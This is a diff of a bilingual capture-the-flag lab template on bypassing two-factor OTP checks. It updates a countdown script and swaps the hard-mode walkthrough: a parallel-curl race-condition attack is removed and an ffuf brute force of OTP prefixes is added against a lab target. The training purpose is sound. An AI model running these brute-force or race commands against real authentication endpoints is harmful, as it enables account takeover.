@@ -99,8 +99,8 @@
     </p>
     {% elif difficulty == 'hard' %}
     <p class="text-xs text-yellow-600 text-center mt-3">
-      <span class="lang-content" data-lang="es">Tip: hay una ventana de ~80ms entre la validación y el marcado del token como usado.</span>
-      <span class="lang-content" data-lang="en" style="display:none">Tip: there is a ~80ms window between validation and marking the token as used.</span>
+      <span class="lang-content" data-lang="es">Tip: en hard la validación OTP compara solo el prefijo del código.</span>
+      <span class="lang-content" data-lang="en" style="display:none">Tip: in hard mode OTP validation compares only the code prefix.</span>
     </p>
     {% endif %}
   </div>
@@ -169,23 +169,30 @@
 <script>
 (function() {
   {% if flag %}return;{% endif %}
-  var total = 30, remaining = total;
+  var total = {{ state.ttl if state and state.ttl else 300 }};
+  var remaining = {{ remaining if remaining is defined else (state.ttl if state and state.ttl else 300) }};
   var el = document.getElementById('countdown');
   var fill = document.getElementById('countdown-fill');
   if (!el) return;
-  var t = setInterval(function() {
-    remaining--;
-    if (remaining <= 0) { clearInterval(t); remaining = 0; }
-    el.textContent = '0:' + (remaining < 10 ? '0' : '') + remaining;
-    var pct = (remaining / total) * 100;
+
+  function render() {
+    el.textContent = Math.floor(remaining / 60) + ':' + ((remaining % 60) < 10 ? '0' : '') + (remaining % 60);
+    var pct = total > 0 ? (remaining / total) * 100 : 0;
     fill.style.width = pct + '%';
-    if (remaining <= 10) {
+    if (remaining <= 30) {
       el.style.color = '#ef4444';
       fill.style.background = '#ef4444';
-    } else if (remaining <= 20) {
+    } else if (remaining <= 120) {
       el.style.color = '#f59e0b';
       fill.style.background = '#f59e0b';
     }
+  }
+
+  render();
+  var t = setInterval(function() {
+    remaining = Math.max(0, remaining - 1);
+    if (remaining <= 0) { clearInterval(t); remaining = 0; }
+    render();
   }, 1000);
 })();
 </script>
@@ -218,22 +225,18 @@
   -w &lt;(seq -w 0 9999) \
   -mc 200 -fs ERROR_SIZE</pre>
 
-    <h3>Hard — Race condition (TOCTOU)</h3>
-    <p>El servidor hace <code>check → sleep(80ms) → mark_used</code>. Si dos peticiones llegan simultáneamente, ambas pasan el check antes de que ninguna marque el token.</p>
+    <h3>Hard — Validación parcial del OTP (prefijo)</h3>
+    <p>El backend compara solo el prefijo del código OTP en lugar de exigir coincidencia exacta de 6 dígitos.</p>
     <ol>
-      <li>Necesitas el OTP válido: usa Easy mode para obtenerlo, luego cambia a Hard.</li>
-      <li>Envía múltiples peticiones en paralelo con el mismo OTP:</li>
+      <li>Inicia sesión y llega a la verificación 2FA.</li>
+      <li>Prueba con prefijos de 3 dígitos (000–999):</li>
     </ol>
-    <pre># Bash — 8 peticiones simultáneas
-OTP=123456
-SESSION="TU_SESSION_COOKIE"
-for i in $(seq 1 8); do
-  curl -s -X POST http://{{ target_ip }}/2fa/verify \
-    -b "session=$SESSION" \
-    -d "otp=$OTP" &amp;
-done
-wait</pre>
-    <p>Con Burp Suite: envía la petición al Intruder con el mismo payload repetido 8 veces y en Settings → Resource Pool → Max concurrent requests: 8.</p>
+    <pre>ffuf -u http://{{ target_ip }}/2fa/verify \
+  -X POST -b "session=TU_COOKIE" \
+  -d "otp=FUZZ" \
+  -w &lt;(seq -w 0 999) \
+  -mc 200 -fr "Código incorrecto"</pre>
+    <p>Cuando el prefijo coincide, el servidor acepta el OTP incompleto y devuelve la flag.</p>
 
     <h3>Herramientas</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">DevTools</span></div>
@@ -260,21 +263,18 @@ wait</pre>
       <li>Launch the attack. Filter by response length different from the error.</li>
     </ol>
 
-    <h3>Hard — Race condition (TOCTOU)</h3>
-    <p>The server does <code>check → sleep(80ms) → mark_used</code>. If two requests arrive simultaneously, both pass the check before either marks the token as used.</p>
+    <h3>Hard — Partial OTP validation (prefix match)</h3>
+    <p>The backend validates only the OTP prefix instead of requiring an exact 6-digit match.</p>
     <ol>
-      <li>You need the valid OTP: use Easy mode to get it, then switch to Hard.</li>
-      <li>Send multiple parallel requests with the same OTP:</li>
+      <li>Log in and reach the 2FA verification page.</li>
+      <li>Try 3-digit prefixes (000–999):</li>
     </ol>
-    <pre># Bash — 8 simultaneous requests
-OTP=123456
-SESSION="YOUR_SESSION_COOKIE"
-for i in $(seq 1 8); do
-  curl -s -X POST http://{{ target_ip }}/2fa/verify \
-    -b "session=$SESSION" \
-    -d "otp=$OTP" &amp;
-done
-wait</pre>
+    <pre>ffuf -u http://{{ target_ip }}/2fa/verify \
+  -X POST -b "session=YOUR_COOKIE" \
+  -d "otp=FUZZ" \
+  -w &lt;(seq -w 0 999) \
+  -mc 200 -fr "Código incorrecto"</pre>
+    <p>When the prefix matches, the backend accepts the incomplete OTP and returns the flag.</p>
 
     <h3>Tools</h3>
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">DevTools</span></div>
